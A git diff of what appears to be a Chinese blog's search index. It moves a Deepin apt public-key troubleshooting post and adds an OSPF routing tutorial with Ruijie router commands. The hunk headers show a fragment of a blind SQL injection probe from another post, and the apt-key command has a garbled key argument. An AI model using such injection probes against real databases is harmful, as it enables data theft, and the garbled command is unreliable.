@@ -1073,6 +1073,64 @@ select * from users where id&#x3D;1 and greatest(ascii(substr(database(),1,1)),6
       </tags>
   </entry>
   <entry>
+    <title>Deepin检查更新失败</title>
+    <url>/posts/8b4f8dc5/</url>
+    <content><![CDATA[<p>我们更新deepin系统是总会出现检查更新失败,去终端输入命令发现是没有公钥无法验证下列签名</p>
+<pre class="language-none"><code class="language-none">root@123-PC:~$ sudo apt-get update
+获取:1 https:&#x2F;&#x2F;d.store.deepinos.org.cn  InRelease [1,524 B]
+命中:3 https:&#x2F;&#x2F;community-packages.deepin.com&#x2F;deepin apricot InRelease                                        
+命中:4 https:&#x2F;&#x2F;community-packages.deepin.com&#x2F;printer eagle InRelease                                
+获取:5 https:&#x2F;&#x2F;packages.microsoft.com&#x2F;repos&#x2F;edge stable InRelease [7,343 B]                         
+命中:2 https:&#x2F;&#x2F;home-store-img.uniontech.com&#x2F;appstore deepin InRelease
+错误:5 https:&#x2F;&#x2F;packages.microsoft.com&#x2F;repos&#x2F;edge stable InRelease
+  由于没有公钥，无法验证下列签名： NO_PUBKEY EB3E94ADDE1229DD
+正在读取软件包列表... 完成
+W: GPG 错误：https:&#x2F;&#x2F;packages.microsoft.com&#x2F;repos&#x2F;edge stable InRelease: 由于没有公钥，无法验证下列签名： NO_PUBKEY EB3E94ADDE1229DD
+E: 仓库 “https:&#x2F;&#x2F;packages.microsoft.com&#x2F;repos&#x2F;edge stable InRelease” 没有数字签名。
+N: 无法安全地用该源进行更新，所以默认禁用该源。
+N: 参见 apt-secure(8) 手册以了解仓库创建和用户配置方面的细节。
+</code></pre>
+
+<h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><p>第三方应用商店商店（星火应用商店）的更新源与系统更新源冲突导致。</p>
+<h3 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h3><h3 id="方法一：把星火应用商店的仓库禁用"><a href="#方法一：把星火应用商店的仓库禁用" class="headerlink" title="方法一：把星火应用商店的仓库禁用"></a>方法一：把星火应用商店的仓库禁用</h3><blockquote>
+<p>注：此做法不影响星火应用商店安装应用</p>
+</blockquote>
+<p>打开终端先执行</p>
+<p><code>cd /etc/apt/sources.list.d</code></p>
+<p>再执行</p>
+<p><code>sudo mv sparkstore.list sparkstore.list.bkup</code></p>
+<h3 id="方法二：更新公钥"><a href="#方法二：更新公钥" class="headerlink" title="方法二：更新公钥"></a>方法二：更新公钥</h3><p>打开终端输入</p>
+<p><code>sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys c #此处的EB3E94ADDE1229DD是报错时提示的key</code></p>
+<p>完成后显示</p>
+<pre class="language-xiao@xiao-PC:~$" data-language="xiao@xiao-PC:~$"><div class="caption"><span>sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys EB3E94ADBE1229CF</span></div><code class="language-xiao@xiao-PC:~$">Executing: &#x2F;tmp&#x2F;apt-key-gpghome.CB8XSEEM1u&#x2F;gpg.1.sh --keyserver keyserver.ubuntu.com --recv-keys EB3E94ADDE1229DD
+gpg: 密钥 EB3E94ADDE1229DD：公钥 “Microsoft (Release signing) &lt;gpgsecurity@microsoft.com&gt;” 已导入
+gpg: 处理的总数：1
+gpg:               已导入：1</code></pre>
+
+<p>之后输入</p>
+<p><code>sudo apt-get update</code></p>
+<p>提示</p>
+<pre class="language-获取:1" data-language="获取:1"><div class="caption"><span>https://d.store.deepinos.org.cn  InRelease [1,524 B]</span></div><code class="language-获取:1">命中:3 https:&#x2F;&#x2F;community-packages.deepin.com&#x2F;deepin apricot InRelease                                        
+获取:4 https:&#x2F;&#x2F;packages.microsoft.com&#x2F;repos&#x2F;edge stable InRelease [7,343 B]                                  
+命中:5 https:&#x2F;&#x2F;community-packages.deepin.com&#x2F;printer eagle InRelease                                         
+命中:2 https:&#x2F;&#x2F;home-store-img.uniontech.com&#x2F;appstore deepin InRelease
+获取:6 https:&#x2F;&#x2F;packages.microsoft.com&#x2F;repos&#x2F;edge stable&#x2F;main amd64 Packages [11.4 kB]
+已下载 12.9 kB，耗时 1秒 (15.5 kB&#x2F;s)
+正在读取软件包列表... 完成</code></pre>
+
+
+
+<p>之后就可以去设置里更新系统了</p>
+]]></content>
+      <categories>
+        <category>教程</category>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>deepin</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>GRE隧道</title>
     <url>/posts/ca260099/</url>
     <content><![CDATA[<h1 id="GRE隧道"><a href="#GRE隧道" class="headerlink" title="GRE隧道"></a>GRE隧道</h1><h2 id="拓扑"><a href="#拓扑" class="headerlink" title="拓扑"></a>拓扑</h2><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220618193734.png" alt="image-20220618193734151" loading="lazy"></p>
@@ -1495,64 +1553,6 @@ select * from users where id&#x3D;1 and greatest(ascii(substr(database(),1,1)),6
       </categories>
       <tags>
         <tag>锐捷</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Deepin检查更新失败</title>
-    <url>/posts/8b4f8dc5/</url>
-    <content><![CDATA[<p>我们更新deepin系统是总会出现检查更新失败,去终端输入命令发现是没有公钥无法验证下列签名</p>
-<pre class="language-none"><code class="language-none">root@123-PC:~$ sudo apt-get update
-获取:1 https:&#x2F;&#x2F;d.store.deepinos.org.cn  InRelease [1,524 B]
-命中:3 https:&#x2F;&#x2F;community-packages.deepin.com&#x2F;deepin apricot InRelease                                        
-命中:4 https:&#x2F;&#x2F;community-packages.deepin.com&#x2F;printer eagle InRelease                                
-获取:5 https:&#x2F;&#x2F;packages.microsoft.com&#x2F;repos&#x2F;edge stable InRelease [7,343 B]                         
-命中:2 https:&#x2F;&#x2F;home-store-img.uniontech.com&#x2F;appstore deepin InRelease
-错误:5 https:&#x2F;&#x2F;packages.microsoft.com&#x2F;repos&#x2F;edge stable InRelease
-  由于没有公钥，无法验证下列签名： NO_PUBKEY EB3E94ADDE1229DD
-正在读取软件包列表... 完成
-W: GPG 错误：https:&#x2F;&#x2F;packages.microsoft.com&#x2F;repos&#x2F;edge stable InRelease: 由于没有公钥，无法验证下列签名： NO_PUBKEY EB3E94ADDE1229DD
-E: 仓库 “https:&#x2F;&#x2F;packages.microsoft.com&#x2F;repos&#x2F;edge stable InRelease” 没有数字签名。
-N: 无法安全地用该源进行更新，所以默认禁用该源。
-N: 参见 apt-secure(8) 手册以了解仓库创建和用户配置方面的细节。
-</code></pre>
-
-<h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><p>第三方应用商店商店（星火应用商店）的更新源与系统更新源冲突导致。</p>
-<h3 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h3><h3 id="方法一：把星火应用商店的仓库禁用"><a href="#方法一：把星火应用商店的仓库禁用" class="headerlink" title="方法一：把星火应用商店的仓库禁用"></a>方法一：把星火应用商店的仓库禁用</h3><blockquote>
-<p>注：此做法不影响星火应用商店安装应用</p>
-</blockquote>
-<p>打开终端先执行</p>
-<p><code>cd /etc/apt/sources.list.d</code></p>
-<p>再执行</p>
-<p><code>sudo mv sparkstore.list sparkstore.list.bkup</code></p>
-<h3 id="方法二：更新公钥"><a href="#方法二：更新公钥" class="headerlink" title="方法二：更新公钥"></a>方法二：更新公钥</h3><p>打开终端输入</p>
-<p><code>sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys c #此处的EB3E94ADDE1229DD是报错时提示的key</code></p>
-<p>完成后显示</p>
-<pre class="language-xiao@xiao-PC:~$" data-language="xiao@xiao-PC:~$"><div class="caption"><span>sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys EB3E94ADBE1229CF</span></div><code class="language-xiao@xiao-PC:~$">Executing: &#x2F;tmp&#x2F;apt-key-gpghome.CB8XSEEM1u&#x2F;gpg.1.sh --keyserver keyserver.ubuntu.com --recv-keys EB3E94ADDE1229DD
-gpg: 密钥 EB3E94ADDE1229DD：公钥 “Microsoft (Release signing) &lt;gpgsecurity@microsoft.com&gt;” 已导入
-gpg: 处理的总数：1
-gpg:               已导入：1</code></pre>
-
-<p>之后输入</p>
-<p><code>sudo apt-get update</code></p>
-<p>提示</p>
-<pre class="language-获取:1" data-language="获取:1"><div class="caption"><span>https://d.store.deepinos.org.cn  InRelease [1,524 B]</span></div><code class="language-获取:1">命中:3 https:&#x2F;&#x2F;community-packages.deepin.com&#x2F;deepin apricot InRelease                                        
-获取:4 https:&#x2F;&#x2F;packages.microsoft.com&#x2F;repos&#x2F;edge stable InRelease [7,343 B]                                  
-命中:5 https:&#x2F;&#x2F;community-packages.deepin.com&#x2F;printer eagle InRelease                                         
-命中:2 https:&#x2F;&#x2F;home-store-img.uniontech.com&#x2F;appstore deepin InRelease
-获取:6 https:&#x2F;&#x2F;packages.microsoft.com&#x2F;repos&#x2F;edge stable&#x2F;main amd64 Packages [11.4 kB]
-已下载 12.9 kB，耗时 1秒 (15.5 kB&#x2F;s)
-正在读取软件包列表... 完成</code></pre>
-
-
-
-<p>之后就可以去设置里更新系统了</p>
-]]></content>
-      <categories>
-        <category>教程</category>
-        <category>Linux</category>
-      </categories>
-      <tags>
-        <tag>deepin</tag>
       </tags>
   </entry>
   <entry>
@@ -2720,6 +2720,504 @@ tcp 100.1.1.100:23 192.168.1.3:23 100.1.1.1:1026 100.1.1.1:1026</code></pre></li
       </tags>
   </entry>
   <entry>
+    <title>OSPF基础</title>
+    <url>/posts/2400a6ce/</url>
+    <content><![CDATA[<div class="danger">
+
+<blockquote>
+<p> 资料来源<a href="https://talent.ruijie.com.cn/certification/profession/">锐捷</a><br> 非原创</p>
+</blockquote>
+</div>
+
+
+
+<br>
+
+<br>
+
+<p>OSPF协议，全称开放最短路径优先协议（ Open Shortest Path First ），它是IETF组织开发的一个基于 链路状态的内部网关路由协议（IGP）。因其的开放性以及丰富的功能特性，成为目前业内使用最广泛的 路由协议之一</p>
+<h2 id="OSPF的基本概念"><a href="#OSPF的基本概念" class="headerlink" title="OSPF的基本概念"></a>OSPF的基本概念</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><ul>
+<li>专为TCP&#x2F;IP网络设计，支持VLSM、路由汇总、等价负载均衡、区域划分、认证 </li>
+<li>OSPF在RGOS平台上的管理距离（AD）是110 </li>
+<li>OSPF报文封装在IP报文中，IP协议号为89 </li>
+<li>OSPF具有无环路、收敛快、扩展性好，可适应大规模网络 </li>
+<li>OSPF目前应用中有两个版本： <ul>
+<li>V2：适用于IPv4 </li>
+<li>V3：扩展支持IPv6</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620154540.png" alt="1" loading="lazy"></p>
+<h3 id="OSPF的Cost值"><a href="#OSPF的Cost值" class="headerlink" title="OSPF的Cost值"></a>OSPF的Cost值</h3><ul>
+<li><p>OSPF的接口开销（Cost）计算方式：基于物理链路的带宽来计算度量值 </p>
+<ul>
+<li>Cost&#x3D;默认计算基数&#x2F;物理链路带宽（Bit为单位），默认计算基数&#x3D; 108 bit&#x3D;100M<ul>
+<li>100M带宽的接口，Cost值就是1 </li>
+<li>10M带宽的接口，Cost值就是10</li>
+</ul>
+</li>
+<li>如结果出现小数，会舍弃小数部分取整（如果整数部分为0，则Cost值记为1）， 例如带宽是1000M的链路， Cost值也是1</li>
+</ul>
+</li>
+<li><p>OSPF路由条目的Cost值&#x3D;路由的原始Cost值和沿途入向接口Cost值的累</p>
+</li>
+<li><p>如图，当10.1.0.0&#x2F;24访问10.2.0.0&#x2F;24时，数据从F0&#x2F;1出去，这是一条次优路径！ </p>
+</li>
+<li><p>修改Cost值解决.</p>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620154547.png" alt="2" loading="lazy"></p>
+<ul>
+<li>方案一：在OSPF进程中可以修改度量值计算基数来避免这种问题。命令中的1000代表默认计算基数1000M</li>
+</ul>
+  <pre class="language-none"><code class="language-none">Ruijie(config)#router ospf 10
+Ruijie(config-router)#auto-cost reference-bandwidth 1000</code></pre>
+
+<ul>
+<li>方案二：在接口下，使用该命令，直接修改Cost值为200，来影响OSPF路径计算结果</li>
+</ul>
+  <pre class="language-none"><code class="language-none">uijie(config)#int f0&#x2F;1
+Ruijie(config-if)#ip ospf cost 200</code></pre>
+
+<h2 id="OSPF邻居建立的过程"><a href="#OSPF邻居建立的过程" class="headerlink" title="OSPF邻居建立的过程"></a>OSPF邻居建立的过程</h2><h3 id="OSPF相关术语"><a href="#OSPF相关术语" class="headerlink" title="OSPF相关术语"></a>OSPF相关术语</h3><ul>
+<li>Router-ID：在AS中唯一标识一台运行OSPF的路由器的编号 <ul>
+<li>AS（自治系统 Autonomous System） ：使用同一种路由协议一组路由器所构成的一套系统 </li>
+<li>每个运行OSPF的路由器都必须有一个Router ID，同一个AS内，Router-ID不能重复 </li>
+<li>Router-ID可以手动命令配置，也可以系统自动选举</li>
+</ul>
+</li>
+<li>邻居（Neighbor）：两台运行OSPF协议的路由器，从它们相连的接口上会相互发出各自的OSPF参数， 如果双方的参数符合建立邻居的条件，就会形成邻居关系 </li>
+<li>邻接（Adjacency）：邻居不一定邻接。如果两台路由设备之间交换链路状态信息，并根据更新后的数据库计算 出OSPF路由，才能称为邻接关系</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620154600.png" alt="3" loading="lazy"></p>
+<h3 id="Router-ID"><a href="#Router-ID" class="headerlink" title="Router ID"></a>Router ID</h3><ul>
+<li>在没有手工指定的情况下（手工指定，直接成为Route ID）<ul>
+<li>如果本地有激活的Loopback接口，则取Loopback接口IP最大值作为OSPF Router-ID </li>
+<li>如果没有Loopback接口，则取活跃的物理接口IP地址中的最大值</li>
+</ul>
+</li>
+<li>项目实施中，一般先创建loopback接口并配置IP地址，随后手工指定OSPF Router-ID为该接口地址</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620154604.png" alt="4" loading="lazy"></p>
+<h3 id="OSPF的五种报文类型"><a href="#OSPF的五种报文类型" class="headerlink" title="OSPF的五种报文类型"></a>OSPF的五种报文类型</h3><ul>
+<li>有5种不同OSPF报文类型，这些报文类型用从1到5的类型号标识</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620154616.png" alt="5" loading="lazy"></p>
+<h3 id="OSPF邻居建立的三个阶段"><a href="#OSPF邻居建立的三个阶段" class="headerlink" title="OSPF邻居建立的三个阶段"></a>OSPF邻居建立的三个阶段</h3><ul>
+<li>邻居发现，形成邻居：（成功的标志：2-Way状态） <ul>
+<li>通过Hello报文发现并形成邻居关系 </li>
+<li>形成邻居表</li>
+</ul>
+</li>
+<li>形成邻接，路由通告：（成功的标志：Full状态，LSDB同步） <ul>
+<li>邻接路由器之间通过LSU洪泛LSA，通告拓扑信息 </li>
+<li>通过DBD、LSR、LSACK辅助LSA的同步</li>
+<li>最终同一个区域内所有路由器LSDB完全相同</li>
+</ul>
+</li>
+<li>路由计算阶段： <ul>
+<li>LSDB同步后，每台路由器独立进行SPF运算</li>
+<li>把计算出的最佳路由信息放进路由表</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620154621.png" alt="6" loading="lazy"></p>
+<h3 id="OSPF常用的三张状态表"><a href="#OSPF常用的三张状态表" class="headerlink" title="OSPF常用的三张状态表"></a>OSPF常用的三张状态表</h3><ul>
+<li>邻居表（Neighbor Table）： <ul>
+<li>通过Hello报文形成邻居	</li>
+<li>用邻居机制来维持路由 </li>
+<li>邻居表存储双向通信的OSPF路由器列表信息</li>
+</ul>
+</li>
+</ul>
+<pre class="language-none"><code class="language-none">R2#show ip ospf neighbor 
+Neighbor ID Pri State Dead Time Address Interface
+172.16.2.254 0 FULL&#x2F; - 00:00:33 10.1.0.1 Serial0&#x2F;1&#x2F;0
+10.3.0.254 1 FULL&#x2F;BDR 00:00:31 10.2.0.2 FastEthernet0&#x2F;0</code></pre>
+
+
+
+
+
+<ul>
+<li>链路状态数据库（LSDB）： <ul>
+<li>通过LSU报文更新LSDB </li>
+<li>描述拓扑信息的LSA存储在LSDB中</li>
+</ul>
+</li>
+</ul>
+<pre class="language-none"><code class="language-none">R2#show ip ospf database 
+OSPF Router with ID (10.2.0.1) (Process ID 10)
+Router Link States (Area 0)
+Link ID ADV Router Age Seq# Checksum Link count
+172.16.2.254 172.16.2.254 352 0x80000004 0x00097c 4
+10.2.0.1 10.2.0.1 310 0x80000004 0x005554 3
+10.3.0.254 10.3.0.254 310 0x80000003 0x006a97 2
+Net Link States (Area 0)
+Link ID ADV Router Age Seq# Checksum
+10.2.0.1 10.2.0.1 310 0x80000001 0x004303</code></pre>
+
+
+
+<ul>
+<li>路由表（RIB）： <ul>
+<li>OSPF计算出来的路由将会加载到路由表 </li>
+<li>路由优先级 O&gt;O IA&gt;[O E1&#x2F;N1]&gt;[O E2&#x2F;N2]</li>
+</ul>
+</li>
+</ul>
+<pre class="language-none"><code class="language-none">R2#show ip route 
+O 10.3.0.0 [110&#x2F;2] via 10.2.0.2, 00:06:42, FastEthernet0&#x2F;0
+O 172.16.1.0 [110&#x2F;65] via 10.1.0.1, 00:07:27, Serial0&#x2F;1&#x2F;0
+O 172.16.2.0 [110&#x2F;65] via 10.1.0.1, 00:07:27, Serial0&#x2F;1&#x2F;0</code></pre>
+
+
+
+<h3 id="OSPF的邻居发现过程"><a href="#OSPF的邻居发现过程" class="headerlink" title="OSPF的邻居发现过程"></a>OSPF的邻居发现过程</h3><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620154626.png" alt="7" loading="lazy"></p>
+<h3 id="OSPF的链路状态摘要交换过程"><a href="#OSPF的链路状态摘要交换过程" class="headerlink" title="OSPF的链路状态摘要交换过程"></a>OSPF的链路状态摘要交换过程</h3><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620154631.png" alt="8" loading="lazy"></p>
+<h3 id="OSPF的详细链路状态信息同步过程"><a href="#OSPF的详细链路状态信息同步过程" class="headerlink" title="OSPF的详细链路状态信息同步过程"></a>OSPF的详细链路状态信息同步过程</h3><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620154635.png" alt="9" loading="lazy"></p>
+<h3 id="OSPF的路由计算与路由表加载"><a href="#OSPF的路由计算与路由表加载" class="headerlink" title="OSPF的路由计算与路由表加载"></a>OSPF的路由计算与路由表加载</h3><ul>
+<li>每台OSPF路由器都会使用SPF算法，根据自己的LSDB独立地计算去往每个目的网络的最短路径 <ul>
+<li>同步后，同一区域的OSPF路由器，LSDB一定是相同的</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620154642.png" alt="10" loading="lazy"></p>
+<h2 id="OSPF的网络类型"><a href="#OSPF的网络类型" class="headerlink" title="OSPF的网络类型"></a>OSPF的网络类型</h2><h3 id="广播型多路访问网络-Broadcast"><a href="#广播型多路访问网络-Broadcast" class="headerlink" title="广播型多路访问网络-Broadcast"></a>广播型多路访问网络-Broadcast</h3><ul>
+<li>以太网接口之下，默认的OSPF网络类型为Broadcast </li>
+<li>OSPF在广播多路访问的网络上，会进行DR（Designated Router指定路由器）与BDR（Backup Designated Router）的选举 <ul>
+<li>DR与BDR的能够与该链路上其他路由器（DR other）建立邻接关系，进入Full状态 </li>
+<li>DR other之间建立邻居，停留在2-way状态，不会交换LSA</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620154646.png" alt="11" loading="lazy"></p>
+<h3 id="OSPF的DR、BDR机制"><a href="#OSPF的DR、BDR机制" class="headerlink" title="OSPF的DR、BDR机制"></a>OSPF的DR、BDR机制</h3><ul>
+<li>DR、BDR的机制减少了在同一广播域中邻接的数量，减少了广播网络中LSA的泛洪，节省带宽 </li>
+<li>例如下图的案例中<ul>
+<li>如果两两建立邻接需要15对邻接【排列组合，C（6，2）&#x3D;15】 </li>
+<li>如果DR机制，只需要8对邻接</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620154653.png" alt="12" loading="lazy"></p>
+<h3 id="OSPF的DR、BDR的选举"><a href="#OSPF的DR、BDR的选举" class="headerlink" title="OSPF的DR、BDR的选举"></a>OSPF的DR、BDR的选举</h3><ul>
+<li><p>优先级高的成为DR，其次成为BDR </p>
+<ul>
+<li>Hello报文携带路由设备优先级，默认&#x3D;1 </li>
+<li>优先级为0的路由设备不具备选举资格，未来也不可能为DR或者BDR</li>
+</ul>
+</li>
+<li><p>优先级一致的情况下，Router ID更高的成为DR，第二高的成为BDR </p>
+<ul>
+<li>DR和BDR一旦选定，即使OSPF区域内新增优先级更高的路由设备，DR和BDR也不会重新选举，只有当DR和 BDR都失效后，才参与选举 </li>
+<li>优先级是基于接口的，修改命令如下</li>
+</ul>
+<pre class="language-none"><code class="language-none">(config)#int vlan 10
+(config-if-VLAN 10)#ip ospf priority 10</code></pre></li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620154659.png" alt="13" loading="lazy"></p>
+<h3 id="DR-x2F-BDR的选举示例一"><a href="#DR-x2F-BDR的选举示例一" class="headerlink" title="DR&#x2F;BDR的选举示例一"></a>DR&#x2F;BDR的选举示例一</h3><ul>
+<li>R5后来加入网络，虽然它的Router ID比原有的DR和BDR都高，但是出于稳定性的考虑，只能成为 DRother路由器。</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620154704.png" alt="14" loading="lazy"></p>
+<h3 id="DR-x2F-BDR的选举示例二"><a href="#DR-x2F-BDR的选举示例二" class="headerlink" title="DR&#x2F;BDR的选举示例二"></a>DR&#x2F;BDR的选举示例二</h3><ul>
+<li>当DR失效时，BDR立刻成为新的DR </li>
+<li>DRother路由器进行竞争，Router ID高成为新BDR</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620154708.png" alt="15" loading="lazy"></p>
+<h2 id="OSPF的区域与基本配置"><a href="#OSPF的区域与基本配置" class="headerlink" title="OSPF的区域与基本配置"></a>OSPF的区域与基本配置</h2><h3 id="OSPF的单区域问题"><a href="#OSPF的单区域问题" class="headerlink" title="OSPF的单区域问题"></a>OSPF的单区域问题</h3><ul>
+<li>同一个区域内所有路由器为了LSDB保持完全相同，在链路发生变动的时候需要更新LSA <ul>
+<li>每台路由器都会收到的大量的LSA通告； </li>
+<li>内部某条链路动荡，都会触发全网路由器重新执行SPF算法，导致网络不稳定；</li>
+</ul>
+</li>
+<li>区域内路由无法汇总，需要维护的路由表越来越大，资源消耗过多，性能下降，影响数据转发</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620154713.png" alt="16" loading="lazy"></p>
+<h3 id="OSPF的单区域问题解决方案"><a href="#OSPF的单区域问题解决方案" class="headerlink" title="OSPF的单区域问题解决方案"></a>OSPF的单区域问题解决方案</h3><ul>
+<li>把大型网络分隔为多个较小，可管理的单元 ：区域（area）： <ul>
+<li>控制LSA只在区域内洪泛，有效地把拓扑变化控制在区域内，拓扑的变化影响限制在本区域 </li>
+<li>提高了网络的稳定性和的扩展性，有利于组建大规模的网络</li>
+<li>在区域边界可以做路由汇总，减小了路由表</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620154717.png" alt="17" loading="lazy"></p>
+<h3 id="OSPF多区域层次化"><a href="#OSPF多区域层次化" class="headerlink" title="OSPF多区域层次化"></a>OSPF多区域层次化</h3><ul>
+<li>OSPF区域可以分为骨干区域和非骨干区域<ul>
+<li>骨干区域：area 0，骨干区域在逻辑上不能被分割；</li>
+<li>非骨干区域：area 0以外的其他区域都是非骨干区域，非骨干区域必须和骨干区域相连</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620154721.png" alt="18" loading="lazy"></p>
+<h3 id="OSPF多区域环境路由器类型"><a href="#OSPF多区域环境路由器类型" class="headerlink" title="OSPF多区域环境路由器类型"></a>OSPF多区域环境路由器类型</h3><ul>
+<li>内部路由器IR （ Internal Area Router）：<ul>
+<li>所有接口在同一个Area内 </li>
+<li>同一区域内的内部路由器，LSDB完全相同</li>
+</ul>
+</li>
+<li>区域边界路由器ABR（ Area Border Router）：<ul>
+<li>接口分属于两个或两个以上的区域，并且有一个活动接口属于area 0 </li>
+<li>ABR为它们所连接的每个区域分别维护单独的LSDB </li>
+<li>区域间路由信息必须通过ABR进行传递</li>
+</ul>
+</li>
+<li>自制系统边界路由器ASBR（Auto System Border Router） <ul>
+<li>自制系统边界的路由器，至少有一个接口属于OSPF之外的其他路由协议</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620154725.png" alt="19" loading="lazy"></p>
+<h3 id="单区域OSPF案例"><a href="#单区域OSPF案例" class="headerlink" title="单区域OSPF案例"></a>单区域OSPF案例</h3><ul>
+<li>OSPF路由案例1需求 <ul>
+<li>在三台路由器上配置OSPF路由，配置OSPF进程号为10 </li>
+<li>配置OSPF区域全为0，使PC1和PC2能ping通PC3</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220620154728.png" alt="20" loading="lazy"></p>
+<h3 id="单区域OSPF案例-——-基础配置"><a href="#单区域OSPF案例-——-基础配置" class="headerlink" title="单区域OSPF案例 —— 基础配置"></a>单区域OSPF案例 —— 基础配置</h3><ul>
+<li>启动OSPF进程：<ul>
+<li>(config)# router ospf [process ID]</li>
+</ul>
+</li>
+<li>配置OSPF运行的接口以及接口的区域ID （建议使用精确宣告）：<ul>
+<li>(config-router)# network network mask area [area ID]</li>
+</ul>
+</li>
+</ul>
+<pre class="language-none"><code class="language-none">R1(config)#router ospf 10
+R1(config-router)#network 172.16.2.254 0.0.0.0 area 0
+R1(config-router)#network 172.16.1.254 0.0.0.0 area 0
+R1(config-router)#network 10.1.0.1 0.0.0.0 area 0</code></pre>
+
+<pre class="language-none"><code class="language-none">R2(config)#router ospf 10
+R2(config-router)#network 10.1.0.2 0.0.0.0 area 0
+R2(config-router)#network 10.2.0.1 0.0.0.0 area 0</code></pre>
+
+<pre class="language-none"><code class="language-none">R3(config)#router ospf 10
+R3(config-router)#network 10.2.0.2 0.0.0.0 area 0
+R3(config-router)#network 10.3.0.254 0.0.0.0 area 0</code></pre>
+
+
+
+<h3 id="单区域OSPF案例-——-路由表"><a href="#单区域OSPF案例-——-路由表" class="headerlink" title="单区域OSPF案例 —— 路由表"></a>单区域OSPF案例 —— 路由表</h3><ul>
+<li>查看R1、R2和R3的路由表 <ul>
+<li>使用特权用户模式命令show ip route，显示IP路由表</li>
+</ul>
+</li>
+</ul>
+<pre class="language-none"><code class="language-none">R1#show ip route
+C 10.1.0.0&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;1
+C 10.1.0.1&#x2F;32 is local host. 
+O 10.2.0.0&#x2F;30 [110&#x2F;2] via 10.1.0.2, 00:00:48, GigabitEthernet 0&#x2F;1
+C 172.16.1.0&#x2F;24 is directly connected, GigabitEthernet 0&#x2F;0
+C 172.16.1.254&#x2F;32 is local host. 
+C 172.16.2.0&#x2F;24 is directly connected, GigabitEthernet 0&#x2F;2
+C 172.16.2.254&#x2F;32 is local host. 
+O 192.168.1.0&#x2F;24 [110&#x2F;3] via 10.1.0.2, 00:00:32, GigabitEthernet 0&#x2F;1</code></pre>
+
+<pre class="language-none"><code class="language-none">R2#show ip route
+C 10.1.0.0&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;0
+C 10.1.0.2&#x2F;32 is local host. 
+C 10.2.0.0&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;1
+C 10.2.0.1&#x2F;32 is local host. 
+O 172.16.1.0&#x2F;24 [110&#x2F;2] via 10.1.0.1, 00:01:25, GigabitEthernet 0&#x2F;0
+O 172.16.2.0&#x2F;24 [110&#x2F;2] via 10.1.0.1, 00:01:25, GigabitEthernet 0&#x2F;0
+O 192.168.1.0&#x2F;24 [110&#x2F;2] via 10.2.0.2, 00:01:12, GigabitEthernet 0&#x2F;1</code></pre>
+
+<pre class="language-none"><code class="language-none">R3#show ip route
+O 10.1.0.0&#x2F;30 [110&#x2F;2] via 10.2.0.1, 00:01:29, GigabitEthernet 0&#x2F;0
+C 10.2.0.0&#x2F;30 is directly connected, GigabitEthernet 0&#x2F;0
+C 10.2.0.2&#x2F;32 is local host. 
+O 172.16.1.0&#x2F;24 [110&#x2F;3] via 10.2.0.1, 00:01:29, GigabitEthernet 0&#x2F;0
+O 172.16.2.0&#x2F;24 [110&#x2F;3] via 10.2.0.1, 00:01:29, GigabitEthernet 0&#x2F;0
+C 192.168.1.0&#x2F;24 is directly connected, GigabitEthernet 0&#x2F;1
+C 192.168.1.254&#x2F;32 is local host</code></pre>
+
+<h3 id="单区域OSPF案例-——-连通性测试"><a href="#单区域OSPF案例-——-连通性测试" class="headerlink" title="单区域OSPF案例 —— 连通性测试"></a>单区域OSPF案例 —— 连通性测试</h3><ul>
+<li>测试网络连通性 <ul>
+<li>PC1和PC2能ping通PC3</li>
+</ul>
